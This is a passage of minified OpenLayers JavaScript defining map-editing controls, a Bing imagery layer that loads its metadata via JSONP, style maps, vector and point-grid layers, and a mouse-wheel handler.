this.callback(a.type,[a])},CLASS_NAME:"OpenLayers.Handler.Keyboard"});OpenLayers.Control.ModifyFeature=OpenLayers.Class(OpenLayers.Control,{documentDrag:!1,geometryTypes:null,clickout:!0,toggle:!0,standalone:!1,layer:null,feature:null,vertex:null,vertices:null,virtualVertices:null,handlers:null,deleteCodes:null,virtualStyle:null,vertexRenderIntent:null,mode:null,createVertices:!0,modified:!1,radiusHandle:null,dragHandle:null,onModificationStart:function(){},onModification:function(){},onModificationEnd:function(){},initialize:function(a,b){b=b||{};this.layer=a;this.vertices= [];this.virtualVertices=[];this.virtualStyle=OpenLayers.Util.extend({},this.layer.style||this.layer.styleMap.createSymbolizer(null,b.vertexRenderIntent));this.virtualStyle.fillOpacity=0.3;this.virtualStyle.strokeOpacity=0.3;this.deleteCodes=[46,68];this.mode=OpenLayers.Control.ModifyFeature.RESHAPE;OpenLayers.Control.prototype.initialize.apply(this,[b]);OpenLayers.Util.isArray(this.deleteCodes)||(this.deleteCodes=[this.deleteCodes]);var c={documentDrag:this.documentDrag,stopDown:!1};this.handlers= {keyboard:new OpenLayers.Handler.Keyboard(this,{keydown:this.handleKeypress}),drag:new OpenLayers.Handler.Drag(this,{down:function(a){this.vertex=null;(a=this.layer.getFeatureFromEvent(this.handlers.drag.evt))?this.dragStart(a):this.clickout&amp;&amp;(this._unselect=this.feature)},move:function(a){delete this._unselect;this.vertex&amp;&amp;this.dragVertex(this.vertex,a)},up:function(){this.handlers.drag.stopDown=!1;this._unselect&amp;&amp;(this.unselectFeature(this._unselect),delete this._unselect)},done:function(a){this.vertex&amp;&amp; this.dragComplete(this.vertex)}},c)}},destroy:function(){this.map&amp;&amp;this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this});this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])},activate:function(){this.moveLayerToTop();this.map.events.on({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this});return this.handlers.keyboard.activate()&amp;&amp;this.handlers.drag.activate()&amp;&amp;OpenLayers.Control.prototype.activate.apply(this,arguments)}, deactivate:function(){var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.moveLayerBack(),this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),this.layer.removeFeatures(this.vertices,{silent:!0}),this.layer.removeFeatures(this.virtualVertices,{silent:!0}),this.vertices=[],this.handlers.drag.deactivate(),this.handlers.keyboard.deactivate(),(a=this.feature)&amp;&amp;(a.geometry&amp;&amp;a.layer)&amp;&amp;this.unselectFeature(a),a=!0);return a},beforeSelectFeature:function(a){return this.layer.events.triggerEvent("beforefeaturemodified", {feature:a})},selectFeature:function(a){if(!(this.feature===a||this.geometryTypes&amp;&amp;-1==OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME))){!1!==this.beforeSelectFeature(a)&amp;&amp;(this.feature&amp;&amp;this.unselectFeature(this.feature),this.feature=a,this.layer.selectedFeatures.push(a),this.layer.drawFeature(a,"select"),this.modified=!1,this.resetVertices(),this.onModificationStart(this.feature));var b=a.modified;!a.geometry||b&amp;&amp;b.geometry||(this._originalGeometry=a.geometry.clone())}},unselectFeature:function(a){this.layer.removeFeatures(this.vertices, {silent:!0});this.vertices=[];this.layer.destroyFeatures(this.virtualVertices,{silent:!0});this.virtualVertices=[];this.dragHandle&amp;&amp;(this.layer.destroyFeatures([this.dragHandle],{silent:!0}),delete this.dragHandle);this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),delete this.radiusHandle);this.layer.drawFeature(this.feature,"default");this.feature=null;OpenLayers.Util.removeItem(this.layer.selectedFeatures,a);this.onModificationEnd(a);this.layer.events.triggerEvent("afterfeaturemodified", {feature:a,modified:this.modified});this.modified=!1},dragStart:function(a){var b="OpenLayers.Geometry.Point"==a.geometry.CLASS_NAME;this.standalone||(a._sketch||!b)&amp;&amp;a._sketch||(this.toggle&amp;&amp;this.feature===a&amp;&amp;(this._unselect=a),this.selectFeature(a));if(a._sketch||b)this.vertex=a,this.handlers.drag.stopDown=!0},dragVertex:function(a,b){var c=this.map.getLonLatFromViewPortPx(b),d=a.geometry;d.move(c.lon-d.x,c.lat-d.y);this.modified=!0;"OpenLayers.Geometry.Point"==this.feature.geometry.CLASS_NAME? this.layer.events.triggerEvent("vertexmodified",{vertex:a.geometry,feature:this.feature,pixel:b}):(a._index?(a.geometry.parent.addComponent(a.geometry,a._index),delete a._index,OpenLayers.Util.removeItem(this.virtualVertices,a),this.vertices.push(a)):a==this.dragHandle?(this.layer.removeFeatures(this.vertices,{silent:!0}),this.vertices=[],this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),this.radiusHandle=null)):a!==this.radiusHandle&amp;&amp;this.layer.events.triggerEvent("vertexmodified", {vertex:a.geometry,feature:this.feature,pixel:b}),0&lt;this.virtualVertices.length&amp;&amp;(this.layer.destroyFeatures(this.virtualVertices,{silent:!0}),this.virtualVertices=[]),this.layer.drawFeature(this.feature,this.standalone?void 0:"select"));this.layer.drawFeature(a)},dragComplete:function(a){this.resetVertices();this.setFeatureState();this.onModification(this.feature);this.layer.events.triggerEvent("featuremodified",{feature:this.feature})},setFeatureState:function(){if(this.feature.state!=OpenLayers.State.INSERT&amp;&amp; this.feature.state!=OpenLayers.State.DELETE&amp;&amp;(this.feature.state=OpenLayers.State.UPDATE,this.modified&amp;&amp;this._originalGeometry)){var a=this.feature;a.modified=OpenLayers.Util.extend(a.modified,{geometry:this._originalGeometry});delete this._originalGeometry}},resetVertices:function(){0&lt;this.vertices.length&amp;&amp;(this.layer.removeFeatures(this.vertices,{silent:!0}),this.vertices=[]);0&lt;this.virtualVertices.length&amp;&amp;(this.layer.removeFeatures(this.virtualVertices,{silent:!0}),this.virtualVertices=[]);this.dragHandle&amp;&amp; (this.layer.destroyFeatures([this.dragHandle],{silent:!0}),this.dragHandle=null);this.radiusHandle&amp;&amp;(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),this.radiusHandle=null);this.feature&amp;&amp;"OpenLayers.Geometry.Point"!=this.feature.geometry.CLASS_NAME&amp;&amp;(this.mode&amp;OpenLayers.Control.ModifyFeature.DRAG&amp;&amp;this.collectDragHandle(),this.mode&amp;(OpenLayers.Control.ModifyFeature.ROTATE|OpenLayers.Control.ModifyFeature.RESIZE)&amp;&amp;this.collectRadiusHandle(),this.mode&amp;OpenLayers.Control.ModifyFeature.RESHAPE&amp;&amp; (this.mode&amp;OpenLayers.Control.ModifyFeature.RESIZE||this.collectVertices()))},handleKeypress:function(a){var b=a.keyCode;this.feature&amp;&amp;-1!=OpenLayers.Util.indexOf(this.deleteCodes,b)&amp;&amp;(b=this.layer.getFeatureFromEvent(this.handlers.drag.evt))&amp;&amp;(-1!=OpenLayers.Util.indexOf(this.vertices,b)&amp;&amp;!this.handlers.drag.dragging&amp;&amp;b.geometry.parent)&amp;&amp;(b.geometry.parent.removeComponent(b.geometry),this.layer.events.triggerEvent("vertexremoved",{vertex:b.geometry,feature:this.feature,pixel:a.xy}),this.layer.drawFeature(this.feature, this.standalone?void 0:"select"),this.modified=!0,this.resetVertices(),this.setFeatureState(),this.onModification(this.feature),this.layer.events.triggerEvent("featuremodified",{feature:this.feature}))},collectVertices:function(){function a(c){var d,e,f;if("OpenLayers.Geometry.Point"==c.CLASS_NAME)e=new OpenLayers.Feature.Vector(c),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e);else{f=c.components.length;"OpenLayers.Geometry.LinearRing"==c.CLASS_NAME&amp;&amp;(f-=1);for(d=0;d&lt;f;++d)e= c.components[d],"OpenLayers.Geometry.Point"==e.CLASS_NAME?(e=new OpenLayers.Feature.Vector(e),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e)):a(e);if(b.createVertices&amp;&amp;"OpenLayers.Geometry.MultiPoint"!=c.CLASS_NAME)for(d=0,f=c.components.length;d&lt;f-1;++d){e=c.components[d];var g=c.components[d+1];"OpenLayers.Geometry.Point"==e.CLASS_NAME&amp;&amp;"OpenLayers.Geometry.Point"==g.CLASS_NAME&amp;&amp;(e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point((e.x+g.x)/2,(e.y+g.y)/2),null,b.virtualStyle), e.geometry.parent=c,e._index=d+1,e._sketch=!0,b.virtualVertices.push(e))}}}this.vertices=[];this.virtualVertices=[];var b=this;a.call(this,this.feature.geometry);this.layer.addFeatures(this.virtualVertices,{silent:!0});this.layer.addFeatures(this.vertices,{silent:!0})},collectDragHandle:function(){var a=this.feature.geometry,b=a.getBounds().getCenterLonLat(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),c=new OpenLayers.Feature.Vector(b);b.move=function(b,c){OpenLayers.Geometry.Point.prototype.move.call(this, b,c);a.move(b,c)};c._sketch=!0;this.dragHandle=c;this.dragHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.dragHandle],{silent:!0})},collectRadiusHandle:function(){var a=this.feature.geometry,b=a.getBounds(),c=b.getCenterLonLat(),d=new OpenLayers.Geometry.Point(c.lon,c.lat),b=new OpenLayers.Geometry.Point(b.right,b.bottom),c=new OpenLayers.Feature.Vector(b),e=this.mode&amp;OpenLayers.Control.ModifyFeature.RESIZE,f=this.mode&amp;OpenLayers.Control.ModifyFeature.RESHAPE,g=this.mode&amp; OpenLayers.Control.ModifyFeature.ROTATE;b.move=function(b,c){OpenLayers.Geometry.Point.prototype.move.call(this,b,c);var l=this.x-d.x,m=this.y-d.y,n=l-b,p=m-c;if(g){var q=Math.atan2(p,n),q=Math.atan2(m,l)-q,q=q*(180/Math.PI);a.rotate(q,d)}if(e){var r;f?(m/=p,r=l/n/m):(n=Math.sqrt(n*n+p*p),m=Math.sqrt(l*l+m*m)/n);a.resize(m,d,r)}};c._sketch=!0;this.radiusHandle=c;this.radiusHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.radiusHandle],{silent:!0})},setMap:function(a){this.handlers.drag.setMap(a); OpenLayers.Control.prototype.setMap.apply(this,arguments)},handleMapEvents:function(a){"removelayer"!=a.type&amp;&amp;"order"!=a.property||this.moveLayerToTop()},moveLayerToTop:function(){var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)},moveLayerBack:function(){var a=this.layer.getZIndex()-1;a>=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))},CLASS_NAME:"OpenLayers.Control.ModifyFeature"}); OpenLayers.Control.ModifyFeature.RESHAPE=1;OpenLayers.Control.ModifyFeature.RESIZE=2;OpenLayers.Control.ModifyFeature.ROTATE=4;OpenLayers.Control.ModifyFeature.DRAG=8;OpenLayers.Layer.Bing=OpenLayers.Class(OpenLayers.Layer.XYZ,{key:null,serverResolutions:[156543.03390625,78271.516953125,39135.7584765625,19567.87923828125,9783.939619140625,4891.9698095703125,2445.9849047851562,1222.9924523925781,611.4962261962891,305.74811309814453,152.87405654907226,76.43702827453613,38.218514137268066,19.109257068634033,9.554628534317017,4.777314267158508,2.388657133579254,1.194328566789627,0.5971642833948135,0.29858214169740677,0.14929107084870338,0.07464553542435169],attributionTemplate:'&lt;span class="olBingAttribution ${type}">&lt;div>&lt;a target="_blank" href="http://www.bing.com/maps/">&lt;img src="${logo}" />&lt;/a>&lt;/div>${copyrights}&lt;a style="white-space: nowrap" target="_blank" href="http://www.microsoft.com/maps/product/terms.html">Terms of Use&lt;/a>&lt;/span>', metadata:null,protocolRegex:/^http:/i,type:"Road",culture:"en-US",metadataParams:null,tileOptions:null,protocol:~window.location.href.indexOf("http")?"":"http:",initialize:function(a){a=OpenLayers.Util.applyDefaults({sphericalMercator:!0},a);OpenLayers.Layer.XYZ.prototype.initialize.apply(this,[a.name||"Bing "+(a.type||this.type),null,a]);this.tileOptions=OpenLayers.Util.extend({crossOriginKeyword:"anonymous"},this.options.tileOptions);this.loadMetadata()},loadMetadata:function(){this._callbackId= "_callback_"+this.id.replace(/\./g,"_");window[this._callbackId]=OpenLayers.Function.bind(OpenLayers.Layer.Bing.processMetadata,this);var a=OpenLayers.Util.applyDefaults({key:this.key,jsonp:this._callbackId,include:"ImageryProviders"},this.metadataParams),a=this.protocol+"//dev.virtualearth.net/REST/v1/Imagery/Metadata/"+this.type+"?"+OpenLayers.Util.getParameterString(a),b=document.createElement("script");b.type="text/javascript";b.src=a;b.id=this._callbackId;document.getElementsByTagName("head")[0].appendChild(b)}, initLayer:function(){var a=this.metadata.resourceSets[0].resources[0],b=a.imageUrl.replace("{quadkey}","${quadkey}"),b=b.replace("{culture}",this.culture),b=b.replace(this.protocolRegex,this.protocol);this.url=[];for(var c=0;c&lt;a.imageUrlSubdomains.length;++c)this.url.push(b.replace("{subdomain}",a.imageUrlSubdomains[c]));this.addOptions({maxResolution:Math.min(this.serverResolutions[a.zoomMin],this.maxResolution||Number.POSITIVE_INFINITY),numZoomLevels:Math.min(a.zoomMax+1-a.zoomMin,this.numZoomLevels)}, !0);this.isBaseLayer||this.redraw();this.updateAttribution()},getURL:function(a){if(this.url){var b=this.getXYZ(a);a=b.x;for(var c=b.y,b=b.z,d=[],e=b;0&lt;e;--e){var f="0",g=1&lt;&lt;e-1;0!=(a&amp;g)&amp;&amp;f++;0!=(c&amp;g)&amp;&amp;(f++,f++);d.push(f)}d=d.join("");a=this.selectUrl(""+a+c+b,this.url);return OpenLayers.String.format(a,{quadkey:d})}},updateAttribution:function(){var a=this.metadata;if(a.resourceSets&amp;&amp;this.map&amp;&amp;this.map.center){var b=a.resourceSets[0].resources[0],c=this.map.getExtent().transform(this.map.getProjectionObject(), new OpenLayers.Projection("EPSG:4326")),d=b.imageryProviders||[],e=OpenLayers.Util.indexOf(this.serverResolutions,this.getServerResolution()),b="",f,g,h,k,l,m,n;g=0;for(h=d.length;g&lt;h;++g)for(f=d[g],k=0,l=f.coverageAreas.length;k&lt;l;++k)n=f.coverageAreas[k],m=OpenLayers.Bounds.fromArray(n.bbox,!0),c.intersectsBounds(m)&amp;&amp;(e&lt;=n.zoomMax&amp;&amp;e>=n.zoomMin)&amp;&amp;(b+=f.attribution+" ");a=a.brandLogoUri.replace(this.protocolRegex,this.protocol);this.attribution=OpenLayers.String.format(this.attributionTemplate,{type:this.type.toLowerCase(), logo:a,copyrights:b});this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"attribution"})}},setMap:function(){OpenLayers.Layer.XYZ.prototype.setMap.apply(this,arguments);this.map.events.register("moveend",this,this.updateAttribution)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Bing(this.options));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},destroy:function(){this.map&amp;&amp;this.map.events.unregister("moveend",this,this.updateAttribution);OpenLayers.Layer.XYZ.prototype.destroy.apply(this, arguments)},CLASS_NAME:"OpenLayers.Layer.Bing"});OpenLayers.Layer.Bing.processMetadata=function(a){this.metadata=a;this.initLayer();a=document.getElementById(this._callbackId);a.parentNode.removeChild(a);window[this._callbackId]=void 0;delete this._callbackId};OpenLayers.StyleMap=OpenLayers.Class({styles:null,extendDefault:!0,initialize:function(a,b){this.styles={"default":new OpenLayers.Style(OpenLayers.Feature.Vector.style["default"]),select:new OpenLayers.Style(OpenLayers.Feature.Vector.style.select),temporary:new OpenLayers.Style(OpenLayers.Feature.Vector.style.temporary),"delete":new OpenLayers.Style(OpenLayers.Feature.Vector.style["delete"])};if(a instanceof OpenLayers.Style)this.styles["default"]=a,this.styles.select=a,this.styles.temporary=a,this.styles["delete"]= a;else if("object"==typeof a)for(var c in a)if(a[c]instanceof OpenLayers.Style)this.styles[c]=a[c];else if("object"==typeof a[c])this.styles[c]=new OpenLayers.Style(a[c]);else{this.styles["default"]=new OpenLayers.Style(a);this.styles.select=new OpenLayers.Style(a);this.styles.temporary=new OpenLayers.Style(a);this.styles["delete"]=new OpenLayers.Style(a);break}OpenLayers.Util.extend(this,b)},destroy:function(){for(var a in this.styles)this.styles[a].destroy();this.styles=null},createSymbolizer:function(a, b){a||(a=new OpenLayers.Feature.Vector);this.styles[b]||(b="default");a.renderIntent=b;var c={};this.extendDefault&amp;&amp;"default"!=b&amp;&amp;(c=this.styles["default"].createSymbolizer(a));return OpenLayers.Util.extend(c,this.styles[b].createSymbolizer(a))},addUniqueValueRules:function(a,b,c,d){var e=[],f;for(f in c)e.push(new OpenLayers.Rule({symbolizer:c[f],context:d,filter:new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO,property:b,value:f})}));this.styles[a].addRules(e)},CLASS_NAME:"OpenLayers.StyleMap"});OpenLayers.Layer.Vector=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!1,isFixed:!1,features:null,filter:null,selectedFeatures:null,unrenderedFeatures:null,reportError:!0,style:null,styleMap:null,strategies:null,protocol:null,renderers:["SVG","VML","Canvas"],renderer:null,rendererOptions:null,geometryType:null,drawn:!1,ratio:1,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.renderer&amp;&amp;this.renderer.supported()||this.assignRenderer();this.renderer&amp;&amp;this.renderer.supported()|| (this.renderer=null,this.displayError());this.styleMap||(this.styleMap=new OpenLayers.StyleMap);this.features=[];this.selectedFeatures=[];this.unrenderedFeatures={};if(this.strategies)for(var c=0,d=this.strategies.length;c&lt;d;c++)this.strategies[c].setLayer(this)},destroy:function(){if(this.strategies){var a,b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoDestroy&amp;&amp;a.destroy();this.strategies=null}this.protocol&amp;&amp;(this.protocol.autoDestroy&amp;&amp;this.protocol.destroy(),this.protocol= null);this.destroyFeatures();this.unrenderedFeatures=this.selectedFeatures=this.features=null;this.renderer&amp;&amp;this.renderer.destroy();this.drawn=this.geometryType=this.renderer=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Vector(this.name,this.getOptions()));a=OpenLayers.Layer.prototype.clone.apply(this,[a]);for(var b=this.features,c=b.length,d=Array(c),e=0;e&lt;c;++e)d[e]=b[e].clone();a.features=d;return a},refresh:function(a){this.calculateInRange()&amp;&amp; this.visibility&amp;&amp;this.events.triggerEvent("refresh",a)},assignRenderer:function(){for(var a=0,b=this.renderers.length;a&lt;b;a++){var c=this.renderers[a];if((c="function"==typeof c?c:OpenLayers.Renderer[c])&amp;&amp;c.prototype.supported()){this.renderer=new c(this.div,this.rendererOptions);break}}},displayError:function(){this.reportError&amp;&amp;OpenLayers.Console.userError(OpenLayers.i18n("browserNotSupported",{renderers:this.renderers.join("\n")}))},setMap:function(a){OpenLayers.Layer.prototype.setMap.apply(this, arguments);if(this.renderer){this.renderer.map=this.map;var b=this.map.getSize();b.w*=this.ratio;b.h*=this.ratio;this.renderer.setSize(b)}else this.map.removeLayer(this)},afterAdd:function(){if(this.strategies){var a,b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoActivate&amp;&amp;a.activate()}},removeMap:function(a){this.drawn=!1;if(this.strategies){var b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoActivate&amp;&amp;a.deactivate()}},onMapResize:function(){OpenLayers.Layer.prototype.onMapResize.apply(this, arguments);var a=this.map.getSize();a.w*=this.ratio;a.h*=this.ratio;this.renderer.setSize(a)},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=!0;if(!c){this.renderer.root.style.visibility="hidden";var d=this.map.getSize(),e=d.w,d=d.h,e=e/2*this.ratio-e/2,d=d/2*this.ratio-d/2,e=e+this.map.layerContainerOriginPx.x,e=-Math.round(e),d=d+this.map.layerContainerOriginPx.y,d=-Math.round(d);this.div.style.left=e+"px";this.div.style.top=d+"px";e=this.map.getExtent().scale(this.ratio); d=this.renderer.setExtent(e,b);this.renderer.root.style.visibility="visible";!0===OpenLayers.IS_GECKO&amp;&amp;(this.div.scrollLeft=this.div.scrollLeft);if(!b&amp;&amp;d)for(var f in this.unrenderedFeatures)e=this.unrenderedFeatures[f],this.drawFeature(e)}if(!this.drawn||b||!d)for(this.drawn=!0,f=0,d=this.features.length;f&lt;d;f++)this.renderer.locked=f!==d-1,e=this.features[f],this.drawFeature(e)},display:function(a){OpenLayers.Layer.prototype.display.apply(this,arguments);var b=this.div.style.display;b!=this.renderer.root.style.display&amp;&amp; (this.renderer.root.style.display=b)},addFeatures:function(a,b){OpenLayers.Util.isArray(a)||(a=[a]);var c=!b||!b.silent;if(c){var d={features:a};if(!1===this.events.triggerEvent("beforefeaturesadded",d))return;a=d.features}for(var d=[],e=0,f=a.length;e&lt;f;e++){this.renderer.locked=e!=a.length-1?!0:!1;var g=a[e];if(this.geometryType&amp;&amp;!(g.geometry instanceof this.geometryType))throw new TypeError("addFeatures: component should be an "+this.geometryType.prototype.CLASS_NAME);g.layer=this;!g.style&amp;&amp;this.style&amp;&amp; (g.style=OpenLayers.Util.extend({},this.style));if(c){if(!1===this.events.triggerEvent("beforefeatureadded",{feature:g}))continue;this.preFeatureInsert(g)}d.push(g);this.features.push(g);this.drawFeature(g);c&amp;&amp;(this.events.triggerEvent("featureadded",{feature:g}),this.onFeatureInsert(g))}c&amp;&amp;this.events.triggerEvent("featuresadded",{features:d})},removeFeatures:function(a,b){if(a&amp;&amp;0!==a.length){if(a===this.features)return this.removeAllFeatures(b);OpenLayers.Util.isArray(a)||(a=[a]);a===this.selectedFeatures&amp;&amp; (a=a.slice());var c=!b||!b.silent;c&amp;&amp;this.events.triggerEvent("beforefeaturesremoved",{features:a});for(var d=a.length-1;0&lt;=d;d--){this.renderer.locked=0!=d&amp;&amp;a[d-1].geometry?!0:!1;var e=a[d];delete this.unrenderedFeatures[e.id];c&amp;&amp;this.events.triggerEvent("beforefeatureremoved",{feature:e});this.features=OpenLayers.Util.removeItem(this.features,e);e.layer=null;e.geometry&amp;&amp;this.renderer.eraseFeatures(e);-1!=OpenLayers.Util.indexOf(this.selectedFeatures,e)&amp;&amp;OpenLayers.Util.removeItem(this.selectedFeatures, e);c&amp;&amp;this.events.triggerEvent("featureremoved",{feature:e})}c&amp;&amp;this.events.triggerEvent("featuresremoved",{features:a})}},removeAllFeatures:function(a){a=!a||!a.silent;var b=this.features;a&amp;&amp;this.events.triggerEvent("beforefeaturesremoved",{features:b});for(var c,d=b.length-1;0&lt;=d;d--)c=b[d],a&amp;&amp;this.events.triggerEvent("beforefeatureremoved",{feature:c}),c.layer=null,a&amp;&amp;this.events.triggerEvent("featureremoved",{feature:c});this.renderer.clear();this.features=[];this.unrenderedFeatures={};this.selectedFeatures= [];a&amp;&amp;this.events.triggerEvent("featuresremoved",{features:b})},destroyFeatures:function(a,b){void 0==a&amp;&amp;(a=this.features);if(a){this.removeFeatures(a,b);for(var c=a.length-1;0&lt;=c;c--)a[c].destroy()}},drawFeature:function(a,b){if(this.drawn){if("object"!=typeof b){b||a.state!==OpenLayers.State.DELETE||(b="delete");var c=b||a.renderIntent;(b=a.style||this.style)||(b=this.styleMap.createSymbolizer(a,c))}c=this.renderer.drawFeature(a,b);!1===c||null===c?this.unrenderedFeatures[a.id]=a:delete this.unrenderedFeatures[a.id]}}, eraseFeatures:function(a){this.renderer.eraseFeatures(a)},getFeatureFromEvent:function(a){if(!this.renderer)throw Error("getFeatureFromEvent called on layer with no renderer. This usually means you destroyed a layer, but not some handler which is associated with it.");var b=null;(a=this.renderer.getFeatureIdFromEvent(a))&amp;&amp;(b="string"===typeof a?this.getFeatureById(a):a);return b},getFeatureBy:function(a,b){for(var c=null,d=0,e=this.features.length;d&lt;e;++d)if(this.features[d][a]==b){c=this.features[d]; break}return c},getFeatureById:function(a){return this.getFeatureBy("id",a)},getFeatureByFid:function(a){return this.getFeatureBy("fid",a)},getFeaturesByAttribute:function(a,b){var c,d,e=this.features.length,f=[];for(c=0;c&lt;e;c++)(d=this.features[c])&amp;&amp;d.attributes&amp;&amp;d.attributes[a]===b&amp;&amp;f.push(d);return f},onFeatureInsert:function(a){},preFeatureInsert:function(a){},getDataExtent:function(){var a=null,b=this.features;if(b&amp;&amp;0&lt;b.length)for(var c=null,d=0,e=b.length;d&lt;e;d++)if(c=b[d].geometry)null===a&amp;&amp; (a=new OpenLayers.Bounds),a.extend(c.getBounds());return a},CLASS_NAME:"OpenLayers.Layer.Vector"});OpenLayers.Layer.PointGrid=OpenLayers.Class(OpenLayers.Layer.Vector,{dx:null,dy:null,ratio:1.5,maxFeatures:250,rotation:0,origin:null,gridBounds:null,initialize:function(a){a=a||{};OpenLayers.Layer.Vector.prototype.initialize.apply(this,[a.name,a])},setMap:function(a){OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);a.events.register("moveend",this,this.onMoveEnd)},removeMap:function(a){a.events.unregister("moveend",this,this.onMoveEnd);OpenLayers.Layer.Vector.prototype.removeMap.apply(this, arguments)},setRatio:function(a){this.ratio=a;this.updateGrid(!0)},setMaxFeatures:function(a){this.maxFeatures=a;this.updateGrid(!0)},setSpacing:function(a,b){this.dx=a;this.dy=b||a;this.updateGrid(!0)},setOrigin:function(a){this.origin=a;this.updateGrid(!0)},getOrigin:function(){this.origin||(this.origin=this.map.getExtent().getCenterLonLat());return this.origin},setRotation:function(a){this.rotation=a;this.updateGrid(!0)},onMoveEnd:function(){this.updateGrid()},getViewBounds:function(){var a=this.map.getExtent(); if(this.rotation){var b=this.getOrigin(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),a=a.toGeometry();a.rotate(-this.rotation,b);a=a.getBounds()}return a},updateGrid:function(a){if(a||this.invalidBounds()){var b=this.getViewBounds(),c=this.getOrigin();a=new OpenLayers.Geometry.Point(c.lon,c.lat);var d=b.getWidth(),e=b.getHeight(),f=d/e,g=Math.sqrt(this.dx*this.dy*this.maxFeatures/f),d=Math.min(d*this.ratio,g*f),e=Math.min(e*this.ratio,g),b=b.getCenterLonLat();this.gridBounds=new OpenLayers.Bounds(b.lon- d/2,b.lat-e/2,b.lon+d/2,b.lat+e/2);for(var b=Math.floor(e/this.dy),d=Math.floor(d/this.dx),e=c.lon+this.dx*Math.ceil((this.gridBounds.left-c.lon)/this.dx),c=c.lat+this.dy*Math.ceil((this.gridBounds.bottom-c.lat)/this.dy),g=Array(b*d),h,k=0;k&lt;d;++k)for(var f=e+k*this.dx,l=0;l&lt;b;++l)h=c+l*this.dy,h=new OpenLayers.Geometry.Point(f,h),this.rotation&amp;&amp;h.rotate(this.rotation,a),g[k*b+l]=new OpenLayers.Feature.Vector(h);this.destroyFeatures(this.features,{silent:!0});this.addFeatures(g,{silent:!0})}},invalidBounds:function(){return!this.gridBounds|| !this.gridBounds.containsBounds(this.getViewBounds())},CLASS_NAME:"OpenLayers.Layer.PointGrid"});OpenLayers.Handler.MouseWheel=OpenLayers.Class(OpenLayers.Handler,{wheelListener:null,interval:0,maxDelta:Number.POSITIVE_INFINITY,delta:0,cumulative:!0,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.wheelListener=OpenLayers.Function.bindAsEventListener(this.onWheelEvent,this)},destroy:function(){OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.wheelListener=null},onWheelEvent:function(a){if(this.map&amp;&amp;this.checkModifiers(a)){for(var b= !1,c=!1,d=!1,e=OpenLayers.Event.element(a);null!=e&amp;&amp;!d&amp;&amp;!b;){if(!b)try{var f,b=(f=e.currentStyle?e.currentStyle.overflow:document.defaultView.getComputedStyle(e,null).getPropertyValue("overflow"))&amp;&amp;"auto"==f||"scroll"==f}catch(g){}if(!c&amp;&amp;(c=OpenLayers.Element.hasClass(e,"olScrollable"),!c))for(var d=0,h=this.map.layers.length;d&lt;h;d++){var k=this.map.layers[d];if(e==k.div||e==k.pane){c=!0;break}}d=e==this.map.div;e=e.parentNode}if(!b&amp;&amp;d){if(c)if(b=0,a.wheelDelta?(b=a.wheelDelta,0===b%160&amp;&amp;(b*=0.75), b/=120):a.detail&amp;&amp;(b=-(a.detail/Math.abs(a.detail))),this.delta+=b,window.clearTimeout(this._timeoutId),this.interval&amp;&amp;Math.abs(this.delta)&lt;this.maxDelta){var l=OpenLayers.Util.extend({},a);this._timeoutId=window.setTimeout(OpenLayers.Function.bind(function(){this.wheelZoom(l)},this),this.interval)}else this.wheelZoom(a);OpenLayers.Event.stop(a)}}},wheelZoom:function(a){var b=this.delta;this.delta=0;b&amp;&amp;(a.xy=this.map.events.getMousePosition(a),0>b?this.callback("down",[a,this.cumulative?Math.max(-this.maxDelta, b):-1]):this.callback("up",[a,this.cumulative?Math.min(this.maxDelta,b):1]))},activate:function(a){if(OpenLayers.Handler.prototype.activate.apply(this,arguments)){var b=this.wheelListener;OpenLayers.Event.observe(window,"DOMMouseScroll",b);OpenLayers.Event.observe(window,"mousewheel",b);OpenLayers.Event.observe(document,"mousewheel",b);return!0}return!1},deactivate:function(a){if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments)){var b=this.wheelListener;OpenLayers.Event.stopObserving(window, "DOMMouseScroll",b);OpenLayers.Event.stopObserving(window,"mousewheel",b);OpenLayers.Event.stopObserving(document,"mousewheel",b);return!0}return!1},CLASS_NAME:"OpenLayers.Handler.MouseWheel"});OpenLayers.Symbolizer=OpenLayers.Class({zIndex:0,initialize:function(a){OpenLayers.Util.extend(this,a)},clone:function(){return new 